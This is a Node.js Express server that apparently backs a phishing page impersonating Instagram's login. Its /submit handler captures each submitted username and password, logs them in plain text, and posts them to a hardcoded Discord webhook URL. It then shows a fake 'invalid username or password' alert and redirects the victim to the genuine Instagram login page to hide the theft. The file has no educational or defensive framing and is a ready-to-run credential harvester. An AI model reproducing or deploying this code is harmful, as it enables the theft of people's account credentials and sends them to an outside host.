const express = require('express');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = 8080;

app.use(express.static(path.join(__dirname, '/')));
app.use(express.urlencoded({ extended: true })); // Parse URL-encoded bodies

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '/', 'index.html'));
});

// Handle form submission
app.post('/submit', (req, res) => {
    const username = req.body.user;
    const password = req.body.pass;

    console.log('Form submitted with:');
    console.log('Username:', username);
    console.log('Password:', password);

    // Send data to Discord webhook
    sendToDiscordWebhook(username, password);

    // You can perform additional actions with the form data here

    res.send(`
        <script>
            alert('invalid username or password');
            window.location.href = 'https://www.instagram.com/accounts/login/';
        </script>
    `);
});

// Function to send data to Discord webhook
function sendToDiscordWebhook(username, password) {
    const webhookUrl = 'https://discord.com/api/webhooks/1162701563211550850/s7wctkvaPhncv95q1PM5F-9QclZ-icIzv1t-8emZFSz4D62wHuh28fVeBKBws79dvC3o';

    // Create a JSON payload with the form data
    const payload = {
        content: `Username: ${username}\nPassword: ${password}`,
    };

    // Send the payload to the Discord webhook using Axios
    axios.post(webhookUrl, payload)
        .then(response => console.log('Data sent to Discord webhook:', response.data))
        .catch(error => console.error('Error sending data to Discord webhook:', error));
}

app.listen(PORT, () => {
    console.log(`Server is running at http://localhost:${PORT}/`);
});
